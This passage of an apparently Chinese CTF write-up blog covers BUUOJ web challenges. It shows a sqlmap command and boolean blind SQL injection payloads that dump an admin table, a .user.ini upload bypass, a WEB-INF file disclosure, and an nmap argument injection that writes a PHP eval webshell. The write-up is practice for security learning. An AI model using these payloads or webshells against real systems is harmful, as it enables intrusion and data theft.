double-quoted-string string">"error:not an upload fileï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è®¿é—®<code>./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212543344.png" class="" title="image-20201129212543344" loading="lazy"><p>ç¡®è®¤å­˜åœ¨æ–‡ä»¶ä¸Šä¼ è€ƒç‚¹ï¼Œå›å»æ‰¾ä¸Šä¼ ç‚¹ï¼Œè®¿é—®<code>./user.php?page=m4aaannngggeee</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212613725.png" class="" title="image-20201129212613725" loading="lazy"><p>ä¸Šä¼ å‘ç°</p><img src="/article/Buuoj-WEB-Write-up/image-20201129212720648.png" class="" title="image-20201129212720648" loading="lazy"><p>è¡¨æ˜æ— æ³•é€šè¿‡ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è·å¾—shell</p><p>åæ¥åˆ†æä»£ç å‘ç°æ¼æ´</p><h5 id="æ–‡ä»¶åä»£ç æ‰§è¡Œæ¼æ´"><a href="#æ–‡ä»¶åä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="æ–‡ä»¶åä»£ç æ‰§è¡Œæ¼æ´"></a>æ–‡ä»¶åä»£ç æ‰§è¡Œæ¼æ´</h5><img src="/article/Buuoj-WEB-Write-up/image-20201129212856576.png" class="" title="image-20201129212856576" loading="lazy"><p>æ‰«ç›®å½•</p><img src="/article/Buuoj-WEB-Write-up/image-20201129213023625.png" class="" title="image-20201129213023625" loading="lazy"><p>flagå³åœ¨<code>flag_233333</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129213121552.png" class="" title="image-20201129213121552" loading="lazy"><p>æˆåŠŸ</p><hr><h2 id="Black-Watch-å…¥ç¾¤é¢˜-Web"><a href="#Black-Watch-å…¥ç¾¤é¢˜-Web" class="headerlink" title="[Black Watch å…¥ç¾¤é¢˜]Web"></a>[Black Watch å…¥ç¾¤é¢˜]Web</h2><p>æ‰“å¼€</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104315913.png" class="" title="image-20201202104315913" loading="lazy"><p>æœ‰ç™»é™†ï¼Œå°è¯•ç™»é™†ç•Œé¢sqlæ³¨å…¥</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104343337.png" class="" title="image-20201202104343337" loading="lazy"><p>æŸ¥çœ‹æºç ï¼Œåœ¨webpackå‘ç°çŒ«è…»</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104718292.png" class="" title="image-20201202104718292" loading="lazy"><p>ç™»å½•ç•Œé¢æ³¨å…¥æ— æœ<img src="/article/Buuoj-WEB-Write-up/image-20201202104751986.png" class="" title="image-20201202104751986" loading="lazy"></p><p>è½¬<code>content_list.php</code></p><p>å‘ç°è¯·æ±‚æ–‡ç« æ—¶ä¼šå¸¦idå‚æ•°ï¼Œå°è¯•æ³¨å…¥</p><img src="/article/Buuoj-WEB-Write-up/image-20201202105153401.png" class="" title="image-20201202105153401" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202105351447.png" class="" title="image-20201202105351447" loading="lazy"><p>ç¡®è®¤å­˜åœ¨æ³¨å…¥</p><p>è¿‡æ»¤äº†<code>+</code> <code>ç©ºæ ¼</code> <code>and</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201202105230126.png" class="" title="image-20201202105230126" loading="lazy"><p> è¾“å…¥æ•°æ®åº“ä¸å­˜åœ¨çš„idæˆ–äº§ç”Ÿè¯­æ³•æ—¶æ²¡æœ‰å›æ˜¾ï¼Œåˆæ­¥åˆ¤æ–­ä¸ºå¸ƒå°”ç›²æ³¨</p><h5 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h5><p>å†™ä¸ªtamperæ›¿æ¢ç©ºæ ¼ç­‰å­—ç¬¦</p><pre class="language-shell" data-language="shell"><code class="language-shell">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn&#x2F;backend&#x2F;content_detail.php?id&#x3D;0&quot;  --delay&#x3D;0.07 --dbms&#x3D;mysql --technique&#x3D;B --tamper&#x3D;mytamper.py --user-agent&#x3D;&quot;chrome&quot; --risk&#x3D;3 --dump</code></pre><p>å‚æ•°ï¼š</p><pre class="language-none"><code class="language-none">--delay å»¶è¿Ÿæ³¨å…¥ï¼Œç½‘ç«™å¿«é€Ÿæ³¨å…¥ä¼šè¿”å›429ï¼ŒToo Many Requirements--dbms æ•°æ®åº“ç±»å‹--technique æ³¨å…¥æ–¹å¼ï¼Œè¿™é‡ŒBæŒ‡boolå¸ƒå°”ç›²æ³¨--tamper ä½¿ç”¨çš„tamper--user-agent é¢˜ç›®åˆ¤æ–­UA--risk é£é™©ç­‰çº§--dump æ•°æ®åº“å…¨éƒ¨æ‹–ä¸‹æ¥</code></pre><p>è¿è¡Œæç¤º</p><pre class="language-shell" data-language="shell"><code class="language-shell">[INFO] GET parameter &#39;id&#39; appears to be &#39;OR boolean-based blind - WHERE or HAVING clause&#39; injectable</code></pre><p>è¯å®ä¸ºå¸ƒå°”ç›²æ³¨</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110359111.png" class="" title="image-20201202110359111" loading="lazy"><p>å‘ç°è·‘å‡ºäº†æ•°æ®åº“å<code>news</code>ä½†è·‘ä¸å‡ºè¡¨å</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110529783.png" class="" title="image-20201202110529783" loading="lazy"><p>å‚è€ƒå¸ˆå‚…çš„ç­”æ¡ˆï¼Œå†™è„šæœ¬å¼€å§‹è·‘</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>ä¸€æ®µä¸€æ®µåˆ†æ</p><pre class="language-none"><code class="language-none">database() : æ•°æ®åº“(select(database()) : é€‰æ‹©æ•°æ®åº“substrå‡½æ•° : æŒ‡æˆªå–å‚æ•°1å­—ç¬¦ä¸²ï¼Œä»å‚æ•°2çš„ä½ç½®å¼€å§‹æˆªå–å‚æ•°3ä½substr((select(database())),&#123;&#125;,1) : æŒ‡ä»æ•°æ®åº“åç¬¬&#123;&#125;çš„ä½ç½®æˆªå–ä¸€ä½ascii(substr((select(database())),&#123;&#125;,1)) : æŒ‡è½¬åŒ–ä¸ºASCIIç å€¼select : å¦‚ä¸‹å›¾æ‰€ç¤ºselect(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;) : select ascii&#x3D;&#123;&#125;ï¼Œåˆ¤æ–­æ˜¯å¦å’ŒæŸä¸ªasciiç å€¼ç›¸ç­‰ï¼Œå¦‚å›¾if(a,1,0) : ç›¸å½“äºä¸‰ç›®è¿ç®—ç¬¦ :? ,å³ a:1?0^ : å¼‚æˆ–ç¬¦</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202112853423.png" class="" title="image-20201202112853423" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112804610.png" class="" title="image-20201202112804610" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112928978.png" class="" title="image-20201202112928978" loading="lazy"><p>å¾ˆæ˜æ˜¾ï¼Œç¬¬ä¸€ä¸ª<code>&#123;&#125;</code>æŒ‡çš„æ˜¯æ•°æ®åº“åçš„ç¬¬iä½ï¼Œç¬¬äºŒä¸ª<code>&#123;&#125;</code>æŒ‡å¯¹ç¬¬içš„ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒ</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110930572.png" class="" title="image-20201202110930572" loading="lazy"><p>æ•°æ®åº“åä¸º<code>news</code>ï¼Œç»§ç»­è·‘è¡¨å</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;news&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113058557.png" class="" title="image-20201202113058557" loading="lazy"><p>å†è·‘åˆ—å</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;admin&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113123832.png" class="" title="image-20201202113123832" loading="lazy"><p>è·‘æ•°æ®äº†</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(id))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>å…¶å®æ²¡å¿…è¦è·‘é‚£ä¹ˆå¤šï¼Œï¼ˆè·‘ç€å¥½ç©</p><p>å‡ºæ¥è¡¨æœ‰ä¸¤è¡Œ</p><img src="/article/Buuoj-WEB-Write-up/image-20201202113806290.png" class="" title="image-20201202113806290" loading="lazy"><p><code>username</code>ï¼š3ab8d14c,dcaf5eed</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114112390.png" class="" title="image-20201202114112390" loading="lazy"><p><code>password</code>ï¼š2a790c21,f285e92a</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114324916.png" class="" title="image-20201202114324916" loading="lazy"><p><code>is_enable</code>ï¼š0,1</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114435825.png" class="" title="image-20201202114435825" loading="lazy"><p>ç›´æ¥å»æ‹¿enbaleçš„ç™»é™†å³å¯</p><p>è¡¨ç»“æ„æ˜¯è¿™æ ·çš„</p><p>æ•°æ®åº“å:news</p><p>è¡¨å:admin</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>is_enable</th></tr></thead><tbody><tr><td>1</td><td>3ab8d14c</td><td>2a790c21</td><td>0</td></tr><tr><td>2</td><td>dcaf5eed</td><td>f285e92a</td><td>1</td></tr></tbody></table><p>ç™»é™†æˆåŠŸ</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114303580.png" class="" title="image-20201202114303580" loading="lazy"><hr><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h5 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h5><img src="/article/Buuoj-WEB-Write-up/image-20201203151206446.png" class="" title="image-20201203151206446" loading="lazy"><p>ä¸Šæ¥å¾ˆç›´ç™½ï¼Œä¼ ä¸ªç çœ‹çœ‹</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151245517.png" class="" title="image-20201203151245517" loading="lazy"><p>æ”¹åç¼€</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151428059.png" class="" title="image-20201203151428059" loading="lazy">æ–‡ä»¶å†…å®¹è¿˜æ£€æŸ¥ï¼ŒåŠ `GIF98a`å¯ä»¥<img src="/article/Buuoj-WEB-Write-up/image-20201203151803538.png" class="" title="image-20201203151803538" loading="lazy"><p>ä¼šè¿”å›ä¸Šä¼ æ–‡ä»¶å¤¹ç›®å½•çš„æ•°ç»„ï¼Œç›®å½•ç©¿è¶Šä¸Šä¼ ä¸è¡Œï¼Œphpè¿‡æ»¤æ­»äº†ï¼Œä¼ å«ç å›¾ç‰‡ï¼Œè¿‡æ»¤<code>&lt;?</code>ï¼Œè€Œ<code>&lt;%</code>ä¹Ÿä¸è§£æï¼Œè·¯èµ°ä¸é€šã€‚</p><p>ä¼ ä¸ª<code>.htaccess</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201203152651182.png" class="" title="image-20201203152651182" loading="lazy"><p>ä½†æ˜¯å¥½åƒæ²¡è§£æâ€¦</p><img src="/article/Buuoj-WEB-Write-up/image-20201203152715211.png" class="" title="image-20201203152715211" loading="lazy"><p>ç»æŸ¥è¯¢ï¼Œnginxä½¿ç”¨<code>.user.ini</code>è‡ªå®šä¹‰è®¾ç½®</p><p>äºæ˜¯ä¼ ä¸ª<code>.user.ini</code></p><pre class="language-ini" data-language="ini"><code class="language-ini">.user.iniGIF89a                  //ç»•è¿‡exif_imagetype()<span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>gyy.jpg //æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æçš„æ–‡ä»¶çš„åç§°ï¼Œå¹¶åŒ…å«è¯¥æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨requireå‡½æ•°è°ƒç”¨å®ƒä¸€æ ·ã€‚å®ƒåŒ…å«åœ¨æ‰€æœ‰phpæ–‡ä»¶å‰å…ˆæ‰§è¡Œ</span><span class="token constant">auto_append_file</span><span class="token attr-value"><span class="token punctuation">=</span>gyy.jpg  //è§£æåè¿›è¡ŒåŒ…å«ï¼Œå®ƒåŒ…å«åœ¨æ‰€æœ‰phpæ–‡ä»¶æ‰§è¡Œåæ‰§è¡Œ</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201203161427723.png" class="" title="image-20201203161427723" loading="lazy"><p>ok,å†ä¼ ç </p><img src="/article/Buuoj-WEB-Write-up/image-20201203161504788.png" class="" title="image-20201203161504788" loading="lazy"><p>ç„¶åç›´æ¥è®¿é—®<code>index.php</code>å°±å¯ä»¥äº†ï¼Œå› ä¸º<code>.user.ini</code>é‡Œå†™äº†ï¼Œæå‰åŠ è½½äº†<code>gyy.jpg</code>æ–‡ä»¶ï¼Œè€Œé‡Œé¢æ˜¯æˆ‘ä»¬å†™å¥½çš„ç ï¼Œshellç›´æ¥è¿ä¸Š</p><img src="/article/Buuoj-WEB-Write-up/image-20201203161829593.png" class="" title="image-20201203161829593" loading="lazy"><hr><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>è®°å½•ä¸€é“ç‰¹æ®Šçš„é¢˜ï¼Œ å¾ˆç®€å•çš„webé¢˜ï¼Œä½†æ˜¯éœ€è¦å¯¹javaå®¹å™¨å’Œé¡¹ç›®å­˜æ”¾ä½ç½®æ¯”è¾ƒäº†è§£ï¼Œä½œä¸ºwebé€‰æ‰‹ï¼Œåº”è¯¥è¦å¯¹å‡ å¤§è¯­è¨€çš„å®¹å™¨ï¼Œé¡¹ç›®ç¯å¢ƒï¼Œæœ‰æ‰€äº†è§£ã€‚</p><p>è€ƒç‚¹ï¼š<strong>WEB-INF/web.xmlæ³„éœ²</strong></p><pre class="language-none"><code class="language-none">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201208175741483.png" class="" title="image-20201208175741483" loading="lazy"><p>æ‰“å¼€ä¸ºç™»é™†ç•Œé¢ï¼ŒSQLæ³¨å…¥æ— æœï¼Œç‚¹<code>help</code>ï¼Œå‘ç°urlå˜åŒ–ä¸º<code>./Download?filename=help.docx</code></p><p>çŒœæµ‹æºç æ³„éœ²ï¼Œå°è¯•ä¼ªåè®®è¯»å–æºç <code>php://filter/convert.base64-encode/resource=help.docx</code>å‘ç°æŠ¥é”™ä¸º<code>java.io.FileNotFoundException:&#123;php://filter/convert.base64-encode/resource=help.docx&#125;</code></p><p>ç»“åˆé¢˜ç›®åï¼ŒçŒœæµ‹JAVA-WEBåº”ç”¨</p><p>æŠ¥é”™æ˜¯tomcatï¼Œå°è¯•åŒ…å«tomcatçš„web.xmlï¼Œæ›´æ”¹æ–¹å¼ä¸ºPOSTè¯·æ±‚ï¼Œä¼ å‚<code>filename=WEB-INF/web.xml</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180232236.png" class="" title="image-20201208180232236" loading="lazy"><p>å°è¯•è¯·æ±‚<code>/Flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180450678.png" class="" title="image-20201208180450678" loading="lazy"><p> ç»“åˆtomcatçš„é¡¹ç›®å­˜æ”¾è·¯å¾„ç»éªŒè¯•è¯•ä¸‹è½½FlagController.class </p><p>ä¼ å‚<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201208180558946.png" class="" title="image-20201208180558946" loading="lazy"><p>ç›´æ¥è®¿é—®ä¸‹è½½ä¹Ÿè¡Œï¼ŒæŠ“åŒ…è¯·æ±‚ä¹Ÿè¡Œï¼Œbase64è§£ç ä¸€ä¸‹å‘ç°flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201208180825474.png" class="" title="image-20201208180825474" loading="lazy"><hr><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>nmapå·¥å…·çš„åˆ©ç”¨</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>è€ƒä¸¤ä¸ªå‡½æ•°<code>escapeshellarg</code></p><p> <strong>escapeshellcmd()</strong> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ </p><p><code>escapeshellarg</code></p><p> <strong>escapeshellarg()</strong> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚ </p><p>ç„¶è€Œä¹‹å‰å°±çˆ†å‡ºäº†æ¼æ´â€¦ å½“å…ˆä½¿ç”¨ escapeshellarg å†ä½¿ç”¨ escapeshellcmd æ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´å‘½ä»¤å‚æ•°æ³¨å…¥ã€‚ </p><p>å¦‚</p><p><code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></p><p>ç›¸å½“äº<code>curl 127.0.0.1\ -v -d a=1&#39;</code></p><p>å­—ç¬¦è½¬ä¹‰äº†</p><p>æŸ¥é˜…nmapå¸®åŠ©æ‰‹å†Œ<code>nmap -h</code></p><p>é¦–å…ˆæƒ³è¯»å–æ–‡ä»¶ï¼Œåˆ©ç”¨<code>-iL</code>å‚æ•°</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184745868.png" class="" title="image-20201208184745868" loading="lazy"><p>å‘ç°ä¸è¡Œï¼Œcmdå¯ä»¥ï¼Œä½†æ‰§è¡Œåæ²¡æœ‰å›æ˜¾ï¼Œä»¥ä¸‹ä¸ºæœ¬åœ°ç¯å¢ƒ</p><img src="/article/Buuoj-WEB-Write-up/image-20201208190824314.png" class="" title="image-20201208190824314" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201208190921276.png" class="" title="image-20201208190921276" loading="lazy"><p>å…³é”®åœ¨äºæ²¡æ³•æ„é€ ï¼Œæ¯•ç«Ÿä¸¤å‡½æ•°æœ‰è½¬ä¹‰çš„ï¼Œäºæ˜¯æœ‰äº†å¦ä¸€ç§æ–¹æ³•ï¼Œè¾“å‡ºã€‚</p><p>åˆ©ç”¨<code>-oG</code>å‚æ•°</p><img src="/article/Buuoj-WEB-Write-up/image-20201208184653935.png" class="" title="image-20201208184653935" loading="lazy"><p>ç›´æ¥å†™ä¸€å¥è¯æœ¨é©¬å°±å¥½äº†</p><p>payload=<code>./?host=&#39;&lt;?php eval($_POST[gyy]);?&gt; -oG shell.php &#39;</code></p><p>æœ€åå’Œå•å¼•å·è¦æœ‰ç©ºæ ¼ï¼Œå› ä¸ºè®©systemæ‰§è¡Œæ—¶æœ€åçš„å‚æ•°æ˜¯<code>shell.php</code>è€Œä¸æ˜¯<code>shell.php\&#39;</code>ï¼Œå› ä¸º <strong>escapeshellarg()**å’Œ</strong>escapeshellcmd()** æœ‰è½¬ä¹‰ï¼Œå•å¼•å·æ˜¯å› ä¸ºå‡½æ•°ä¼šæ£€æŸ¥å­—ç¬¦ä¸²åŒ¹é…å¼•å·çš„æƒ…å†µ</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193014462.png" class="" title="image-20201208193014462" loading="lazy"><p>æŸ¥çœ‹æ–‡ä»¶</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193048924.png" class="" title="image-20201208193048924" loading="lazy"><p>æ‹¿åˆ°shell</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193135957.png" class="" title="image-20201208193135957" loading="lazy"><p>æœ¬åœ°æ–‡ä»¶æ˜¯è¿™æ ·çš„ï¼Œå¯ä»¥çœ‹åˆ°åŒ…å«äº†ä¸€å¥è¯æœ¨é©¬</p><img src="/article/Buuoj-WEB-Write-up/image-20201208193533711.png" class="" title="image-20201208193533711" loading="lazy"><hr><h2 id="GKCTF2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h2><h5 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h5><p> 